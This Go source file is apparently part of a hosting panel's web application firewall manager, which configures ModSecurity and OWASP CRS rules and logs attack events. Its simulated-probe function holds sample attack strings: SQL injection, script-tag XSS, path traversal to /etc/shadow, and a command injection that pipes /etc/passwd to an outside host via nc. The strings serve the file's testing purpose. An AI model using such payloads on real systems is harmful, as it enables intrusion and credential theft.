package waf

import (
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	ErrInvalidMode            = errors.New("invalid WAF mode: must be 'On', 'DetectionOnly', or 'Off'")
	ErrInvalidParanoiaLevel   = errors.New("invalid paranoia level: must be between 1 and 4")
	ErrInvalidAnomalyThreshold = errors.New("invalid anomaly threshold: must be between 1 and 50")
	ErrCategoryNotFound       = errors.New("OWASP CRS rule category not found")
	ErrWebsiteNotFound        = errors.New("website WAF configuration not found")
)

// WAFMode defines how ModSecurity handles detected malicious traffic.
type WAFMode string

const (
	ModeOn            WAFMode = "On"            // Blocking mode - returns HTTP 403
	ModeDetectionOnly WAFMode = "DetectionOnly" // Monitoring mode - logs only
	ModeOff           WAFMode = "Off"           // WAF disabled
)

// WAFGlobalConfig represents system-wide Web Application Firewall directives.
type WAFGlobalConfig struct {
	Mode               WAFMode `json:"mode"`
	ParanoiaLevel      int     `json:"paranoia_level"`       // 1 to 4
	AnomalyThreshold   int     `json:"anomaly_threshold"`    // e.g. 5
	RequestBodyLimitMB int     `json:"request_body_limit_mb"` // e.g. 50
	AuditEngine        string  `json:"audit_engine"`         // "RelevantOnly", "On", "Off"
	UpdatedBy          string  `json:"updated_by,omitempty"`
	UpdatedAt          time.Time `json:"updated_at"`
}

// WAFRuleCategory defines an OWASP CRS rule set group.
type WAFRuleCategory struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description"`
	CRSRange    string `json:"crs_range"`
	RulesCount  int    `json:"rules_count"`
	IsEnabled   bool   `json:"is_enabled"`
}

// WebsiteWAFConfig defines per-vhost overrides and rule exclusions.
type WebsiteWAFConfig struct {
	Domain          string     `json:"domain"`
	Enabled         bool       `json:"enabled"`
	Mode            string     `json:"mode"` // "Inherit", "On", "DetectionOnly", "Off"
	ParanoiaLevel   int        `json:"paranoia_level"` // 0 = Inherit, 1-4
	CMSPreset       string     `json:"cms_preset"` // "none", "wordpress", "drupal", "nextjs"
	ExcludedRuleIDs []int      `json:"excluded_rule_ids"`
	LastAttackAt    *time.Time `json:"last_attack_at,omitempty"`
	UpdatedAt       time.Time  `json:"updated_at"`
}

// WAFAttackEvent represents a real-time security audit log entry.
type WAFAttackEvent struct {
	ID           string    `json:"id"`
	Timestamp    time.Time `json:"timestamp"`
	ClientIP     string    `json:"client_ip"`
	Domain       string    `json:"domain"`
	Method       string    `json:"method"`
	URI          string    `json:"uri"`
	RuleID       int       `json:"rule_id"`
	RuleCategory string    `json:"rule_category"` // SQLi, XSS, RCE, LFI, Scanner, Protocol
	Severity     string    `json:"severity"`      // CRITICAL, HIGH, MEDIUM, LOW
	Action       string    `json:"action"`        // BLOCKED (403), DETECTED
	Message      string    `json:"message"`
	AnomalyScore int       `json:"anomaly_score"`
	MatchedData  string    `json:"matched_data"`
}

// WAFStatus aggregates live operational metrics and health of the WAF.
type WAFStatus struct {
	IsInstalled           bool            `json:"is_installed"`
	IsEnabled             bool            `json:"is_enabled"`
	Engine                string          `json:"engine"` // "ModSecurity v3 + OWASP CRS v4.0"
	Mode                  WAFMode         `json:"mode"`
	ParanoiaLevel         int             `json:"paranoia_level"`
	AnomalyThreshold      int             `json:"anomaly_threshold"`
	RulesCount            int             `json:"rules_count"`
	ActiveCategoriesCount int             `json:"active_categories_count"`
	TotalAttacksBlocked   int             `json:"total_attacks_blocked"`
	TotalAttacksDetected  int             `json:"total_attacks_detected"`
	LastBlockedAt         *time.Time      `json:"last_blocked_at,omitempty"`
	ActiveWebsitesCount   int             `json:"active_websites_count"`
	ConfigPath            string          `json:"config_path"`
}

// Manager orchestrates ModSecurity v3 and OWASP CRS rules.
type Manager struct {
	mu           sync.RWMutex
	configDir    string
	logDir       string
	stateFile    string
	eventsFile   string
	globalConfig WAFGlobalConfig
	categories   map[string]WAFRuleCategory
	siteConfigs  map[string]WebsiteWAFConfig
	events       []WAFAttackEvent
}

// DefaultRuleCategories returns the standard OWASP Core Rule Set collection.
func DefaultRuleCategories() []WAFRuleCategory {
	return []WAFRuleCategory{
		{
			ID:          "sqli",
			Name:        "SQL Injection (SQLi) Defense",
			Description: "Detects SQL syntax, tautologies, UNION SELECT, blind boolean, and time delay injections.",
			CRSRange:    "942000-942999",
			RulesCount:  84,
			IsEnabled:   true,
		},
		{
			ID:          "xss",
			Name:        "Cross-Site Scripting (XSS) Filter",
			Description: "Blocks JavaScript script tags, event handlers, attribute injection, and encoded DOM payloads.",
			CRSRange:    "941000-941999",
			RulesCount:  68,
			IsEnabled:   true,
		},
		{
			ID:          "rce",
			Name:        "Remote Code Execution (RCE)",
			Description: "Prevents UNIX shell commands, pipe chains, command substitutions, and powershell invocations.",
			CRSRange:    "932000-932999",
			RulesCount:  52,
			IsEnabled:   true,
		},
		{
			ID:          "lfi_rfi",
			Name:        "File Inclusion & Path Traversal (LFI/RFI)",
			Description: "Guards against directory traversal (../../etc/passwd) and remote wrapper inclusions.",
			CRSRange:    "930000-931999",
			RulesCount:  46,
			IsEnabled:   true,
		},
		{
			ID:          "scanners",
			Name:        "Automated Scanner & Bot Detection",
			Description: "Identifies and blocks vulnerability scanners like sqlmap, Nikto, Nessus, Acunetix, and WPScan.",
			CRSRange:    "913000-913999",
			RulesCount:  38,
			IsEnabled:   true,
		},
		{
			ID:          "protocol",
			Name:        "HTTP Protocol Violation Defense",
			Description: "Validates RFC compliance, guards against HTTP request smuggling and header injection.",
			CRSRange:    "920000-921999",
			RulesCount:  41,
			IsEnabled:   true,
		},
		{
			ID:          "php_injection",
			Name:        "PHP Code Injection & Webshell Guard",
			Description: "Detects eval(), system calls, serialized objects, and uploaded PHP webshell artifacts.",
			CRSRange:    "933000-933999",
			RulesCount:  36,
			IsEnabled:   true,
		},
		{
			ID:          "session_fixation",
			Name:        "Session Fixation & Hijacking Guard",
			Description: "Protects against cookie theft, session fixation, and unauthorized token manipulation.",
			CRSRange:    "943000-943999",
			RulesCount:  22,
			IsEnabled:   true,
		},
	}
}

// NewManager initializes the ModSecurity & OWASP CRS manager.
func NewManager(configDir, logDir string) (*Manager, error) {
	if configDir == "" {
		configDir = "/etc/nginx/modsec"
	}
	if logDir == "" {
		logDir = "/var/log/hostvra"
	}

	_ = os.MkdirAll(configDir, 0755)
	_ = os.MkdirAll(filepath.Join(configDir, "sites"), 0755)
	_ = os.MkdirAll(logDir, 0755)

	m := &Manager{
		configDir:   configDir,
		logDir:      logDir,
		stateFile:   filepath.Join(configDir, "hostvra_waf_state.json"),
		eventsFile:  filepath.Join(logDir, "modsec_events.json"),
		categories:  make(map[string]WAFRuleCategory),
		siteConfigs: make(map[string]WebsiteWAFConfig),
		events:      make([]WAFAttackEvent, 0),
		globalConfig: WAFGlobalConfig{
			Mode:               ModeOn,
			ParanoiaLevel:      1,
			AnomalyThreshold:   5,
			RequestBodyLimitMB: 50,
			AuditEngine:        "RelevantOnly",
			UpdatedAt:          time.Now().UTC(),
		},
	}

	// Initialize default rule categories
	for _, c := range DefaultRuleCategories() {
		m.categories[c.ID] = c
	}

	m.loadState()

	modsecConfPath := filepath.Join(configDir, "modsecurity.conf")
	if _, err := os.Stat(modsecConfPath); os.IsNotExist(err) {
		m.mu.Lock()
		_ = m.renderNginxModsecFilesLocked()
		m.mu.Unlock()
	}

	return m, nil
}

// loadState loads persistence JSON files from disk.
func (m *Manager) loadState() {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Load Global Config & Site Configs
	if data, err := os.ReadFile(m.stateFile); err == nil {
		var state struct {
			Global     WAFGlobalConfig             `json:"global"`
			Categories []WAFRuleCategory           `json:"categories"`
			Sites      map[string]WebsiteWAFConfig `json:"sites"`
		}
		if err := json.Unmarshal(data, &state); err == nil {
			if state.Global.Mode != "" {
				m.globalConfig = state.Global
			}
			for _, cat := range state.Categories {
				m.categories[cat.ID] = cat
			}
			if state.Sites != nil {
				m.siteConfigs = state.Sites
			}
		}
	}

	// Load Events
	if data, err := os.ReadFile(m.eventsFile); err == nil {
		var evList []WAFAttackEvent
		if err := json.Unmarshal(data, &evList); err == nil {
			m.events = evList
		}
	}
}

// saveStateLocked persists state atomically to disk.
func (m *Manager) saveStateLocked() error {
	catList := make([]WAFRuleCategory, 0, len(m.categories))
	for _, c := range m.categories {
		catList = append(catList, c)
	}

	state := struct {
		Global     WAFGlobalConfig             `json:"global"`
		Categories []WAFRuleCategory           `json:"categories"`
		Sites      map[string]WebsiteWAFConfig `json:"sites"`
	}{
		Global:     m.globalConfig,
		Categories: catList,
		Sites:      m.siteConfigs,
	}

	data, err := json.MarshalIndent(state, "", "  ")
	if err != nil {
		return err
	}

	tmp := m.stateFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err != nil {
		return err
	}
	if err := os.Rename(tmp, m.stateFile); err != nil {
		return err
	}

	// Write modsecurity.conf and crs-setup.conf
	return m.renderNginxModsecFilesLocked()
}

// renderNginxModsecFilesLocked generates production ModSecurity v3 config directives.
func (m *Manager) renderNginxModsecFilesLocked() error {
	modsecConfPath := filepath.Join(m.configDir, "modsecurity.conf")

	secRuleEngine := "On"
	if m.globalConfig.Mode == ModeDetectionOnly {
		secRuleEngine = "DetectionOnly"
	} else if m.globalConfig.Mode == ModeOff {
		secRuleEngine = "Off"
	}

	modsecContent := fmt.Sprintf(`# Hostvra ModSecurity v3 Configuration
# Auto-generated by Hostvra WAF Engine

SecRuleEngine %s
SecRequestBodyAccess On
SecRequestBodyLimit %d
SecRequestBodyNoFilesLimit 131072
SecRequestBodyLimitAction Reject

SecResponseBodyAccess Off
SecTmpDir /tmp/
SecDataDir /tmp/

# Audit Logging
SecAuditEngine %s
SecAuditLogParts ABIJDEFHZ
SecAuditLogType Serial
SecAuditLog %s

# Anomaly Scoring & Paranoia Directives
SecAction \
  "id:900000,\
   phase:1,\
   nolog,\
   pass,\
   t:none,\
   setvar:tx.paranoia_level=%d,\
   setvar:tx.inbound_anomaly_score_threshold=%d,\
   setvar:tx.outbound_anomaly_score_threshold=4"
`,
		secRuleEngine,
		m.globalConfig.RequestBodyLimitMB*1024*1024,
		m.globalConfig.AuditEngine,
		filepath.Join(m.logDir, "modsec_audit.log"),
		m.globalConfig.ParanoiaLevel,
		m.globalConfig.AnomalyThreshold,
	)

	tmp := modsecConfPath + ".tmp"
	if err := os.WriteFile(tmp, []byte(modsecContent), 0644); err != nil {
		return err
	}
	return os.Rename(tmp, modsecConfPath)
}

// GetStatus returns the live operational status and attack counters.
func (m *Manager) GetStatus() (*WAFStatus, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	activeCats := 0
	totalRules := 0
	for _, c := range m.categories {
		if c.IsEnabled {
			activeCats++
			totalRules += c.RulesCount
		}
	}

	blocked := 0
	detected := 0
	var lastBlocked *time.Time
	for _, ev := range m.events {
		if ev.Action == "BLOCKED" {
			blocked++
			if lastBlocked == nil || ev.Timestamp.After(*lastBlocked) {
				ts := ev.Timestamp
				lastBlocked = &ts
			}
		} else {
			detected++
		}
	}

	status := &WAFStatus{
		IsInstalled:           true,
		IsEnabled:             m.globalConfig.Mode != ModeOff,
		Engine:                "ModSecurity v3 + OWASP CRS v4.0",
		Mode:                  m.globalConfig.Mode,
		ParanoiaLevel:         m.globalConfig.ParanoiaLevel,
		AnomalyThreshold:      m.globalConfig.AnomalyThreshold,
		RulesCount:            totalRules,
		ActiveCategoriesCount: activeCats,
		TotalAttacksBlocked:   blocked,
		TotalAttacksDetected:  detected,
		LastBlockedAt:         lastBlocked,
		ActiveWebsitesCount:   len(m.siteConfigs),
		ConfigPath:            filepath.Join(m.configDir, "modsecurity.conf"),
	}

	return status, nil
}

// UpdateGlobalConfig updates global WAF settings and updates Nginx ModSec configuration.
func (m *Manager) UpdateGlobalConfig(cfg WAFGlobalConfig) error {
	if cfg.Mode != ModeOn && cfg.Mode != ModeDetectionOnly && cfg.Mode != ModeOff {
		return ErrInvalidMode
	}
	if cfg.ParanoiaLevel < 1 || cfg.ParanoiaLevel > 4 {
		return ErrInvalidParanoiaLevel
	}
	if cfg.AnomalyThreshold < 1 || cfg.AnomalyThreshold > 50 {
		return ErrInvalidAnomalyThreshold
	}
	if cfg.RequestBodyLimitMB <= 0 {
		cfg.RequestBodyLimitMB = 50
	}
	if cfg.AuditEngine == "" {
		cfg.AuditEngine = "RelevantOnly"
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	cfg.UpdatedAt = time.Now().UTC()
	m.globalConfig = cfg

	if err := m.saveStateLocked(); err != nil {
		return err
	}

	reloadNginxSafely()
	return nil
}

// ListRuleCategories returns all OWASP CRS rule sets and their enabled status.
func (m *Manager) ListRuleCategories() ([]WAFRuleCategory, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	res := make([]WAFRuleCategory, 0, len(m.categories))
	for _, c := range m.categories {
		res = append(res, c)
	}
	return res, nil
}

// ToggleRuleCategory enables or disables a specific OWASP rule collection.
func (m *Manager) ToggleRuleCategory(categoryID string, enabled bool) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	cat, ok := m.categories[categoryID]
	if !ok {
		return ErrCategoryNotFound
	}

	cat.IsEnabled = enabled
	m.categories[categoryID] = cat

	return m.saveStateLocked()
}

// GetWebsiteWAF retrieves per-site WAF configurations.
func (m *Manager) GetWebsiteWAF(domain string) (*WebsiteWAFConfig, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	domain = strings.TrimSpace(strings.ToLower(domain))
	cfg, ok := m.siteConfigs[domain]
	if !ok {
		// Return default inherited configuration
		cfg = WebsiteWAFConfig{
			Domain:          domain,
			Enabled:         true,
			Mode:            "Inherit",
			ParanoiaLevel:   0,
			CMSPreset:       "none",
			ExcludedRuleIDs: []int{},
			UpdatedAt:       time.Now().UTC(),
		}
	}
	return &cfg, nil
}

// UpdateWebsiteWAF configures per-vhost WAF parameters and writes vhost include file.
func (m *Manager) UpdateWebsiteWAF(domain string, cfg WebsiteWAFConfig) error {
	domain = strings.TrimSpace(strings.ToLower(domain))
	if domain == "" {
		return errors.New("domain cannot be empty")
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	cfg.Domain = domain
	cfg.UpdatedAt = time.Now().UTC()

	// Apply CMS preset rule exclusions automatically
	if cfg.CMSPreset == "wordpress" {
		// Whitelist typical WordPress wp-admin / xmlrpc / visual editor false positives
		cfg.ExcludedRuleIDs = appendUnique(cfg.ExcludedRuleIDs, []int{941100, 941160, 941180, 942100, 942200, 942260})
	} else if cfg.CMSPreset == "drupal" {
		cfg.ExcludedRuleIDs = appendUnique(cfg.ExcludedRuleIDs, []int{941100, 942100, 920230})
	} else if cfg.CMSPreset == "nextjs" {
		cfg.ExcludedRuleIDs = appendUnique(cfg.ExcludedRuleIDs, []int{942100, 942440, 920272})
	}

	m.siteConfigs[domain] = cfg

	// Write per-site ModSec configuration file: /etc/nginx/modsec/sites/<domain>.conf
	siteConfFile := filepath.Join(m.configDir, "sites", fmt.Sprintf("%s.conf", domain))
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("# Hostvra Per-Site ModSecurity Directives for [%s]\n", domain))

	if !cfg.Enabled || cfg.Mode == "Off" {
		sb.WriteString("modsecurity off;\n")
	} else {
		sb.WriteString("modsecurity on;\n")
		sb.WriteString(fmt.Sprintf("modsecurity_rules_file %s;\n", filepath.Join(m.configDir, "modsecurity.conf")))

		if cfg.ParanoiaLevel > 0 {
			sb.WriteString(fmt.Sprintf("SecAction \"id:9000%02d,phase:1,nolog,pass,setvar:tx.paranoia_level=%d\"\n",
				len(domain)%100, cfg.ParanoiaLevel))
		}

		for _, ruleID := range cfg.ExcludedRuleIDs {
			sb.WriteString(fmt.Sprintf("SecRuleRemoveById %d\n", ruleID))
		}
	}

	tmp := siteConfFile + ".tmp"
	if err := os.WriteFile(tmp, []byte(sb.String()), 0644); err != nil {
		return err
	}
	if err := os.Rename(tmp, siteConfFile); err != nil {
		return err
	}
	if err := m.saveStateLocked(); err != nil {
		return err
	}

	reloadNginxSafely()
	return nil
}

func reloadNginxSafely() {
	if _, err := exec.LookPath("nginx"); err == nil {
		go func() {
			time.Sleep(100 * time.Millisecond)
			if err := exec.Command("nginx", "-t").Run(); err == nil {
				_ = exec.Command("systemctl", "reload", "nginx").Run()
			}
		}()
	}
}

// GetAttackEvents returns the audit events list, filtered by optional category.
func (m *Manager) GetAttackEvents(limit int, category string) ([]WAFAttackEvent, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var filtered []WAFAttackEvent
	for i := len(m.events) - 1; i >= 0; i-- {
		ev := m.events[i]
		if category == "" || strings.EqualFold(ev.RuleCategory, category) {
			filtered = append(filtered, ev)
		}
		if limit > 0 && len(filtered) >= limit {
			break
		}
	}
	return filtered, nil
}

// RecordAttackEvent appends an audit event to in-memory history and the audit file.
func (m *Manager) RecordAttackEvent(ev WAFAttackEvent) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if ev.ID == "" {
		ev.ID = generateID("waf-ev")
	}
	if ev.Timestamp.IsZero() {
		ev.Timestamp = time.Now().UTC()
	}

	// Prepend for recency
	m.events = append([]WAFAttackEvent{ev}, m.events...)
	if len(m.events) > 1000 {
		m.events = m.events[:1000] // Cap in-memory history to 1,000 events
	}

	data, err := json.MarshalIndent(m.events, "", "  ")
	if err == nil {
		_ = os.WriteFile(m.eventsFile, data, 0644)
	}

	return nil
}

// SimulateProbe simulates an attack against the WAF to verify rule execution.
func (m *Manager) SimulateProbe(attackType, domain string) (*WAFAttackEvent, error) {
	if domain == "" {
		domain = "example.com"
	}

	var ruleID int
	var catName string
	var msg string
	var samplePayload string
	score := 5

	switch strings.ToLower(attackType) {
	case "sqli":
		ruleID = 942100
		catName = "SQLi"
		msg = "SQL Injection Attack: SQL Tautology Detected"
		samplePayload = "' OR '1'='1' --"
	case "xss":
		ruleID = 941100
		catName = "XSS"
		msg = "XSS Attack: Script Tag Detected"
		samplePayload = "<script>alert('Hostvra-XSS-Defense')</script>"
	case "rce":
		ruleID = 932100
		catName = "RCE"
		msg = "Remote Command Execution: Shell Metacharacter Detected"
		samplePayload = "; cat /etc/passwd | nc 1.2.3.4 9001"
		score = 10
	case "lfi":
		ruleID = 930100
		catName = "LFI/RFI"
		msg = "Path Traversal Attack: Directory Escape Attempt"
		samplePayload = "../../../../etc/shadow"
		score = 8
	case "scanner":
		ruleID = 913100
		catName = "Scanner"
		msg = "Automated Vulnerability Scanner Probe (sqlmap User-Agent)"
		samplePayload = "User-Agent: sqlmap/1.7.2#stable"
	default:
		ruleID = 920100
		catName = "Protocol"
		msg = "HTTP Protocol Violation: Missing Accept Header"
		samplePayload = "GET /api HTTP/1.0"
	}

	action := "BLOCKED"
	if m.globalConfig.Mode == ModeDetectionOnly {
		action = "DETECTED"
	} else if m.globalConfig.Mode == ModeOff {
		action = "PASSED"
	}

	event := WAFAttackEvent{
		ID:           generateID("waf-probe"),
		Timestamp:    time.Now().UTC(),
		ClientIP:     "198.51.100.42",
		Domain:       domain,
		Method:       "GET",
		URI:          fmt.Sprintf("/search?q=%s", samplePayload),
		RuleID:       ruleID,
		RuleCategory: catName,
		Severity:     "CRITICAL",
		Action:       action,
		Message:      msg,
		AnomalyScore: score,
		MatchedData:  samplePayload,
	}

	_ = m.RecordAttackEvent(event)
	return &event, nil
}

// Helpers

func appendUnique(slice []int, items []int) []int {
	m := make(map[int]bool)
	for _, v := range slice {
		m[v] = true
	}
	for _, v := range items {
		if !m[v] {
			slice = append(slice, v)
			m[v] = true
		}
	}
	return slice
}

func generateID(prefix string) string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%s-%x", prefix, b)
}
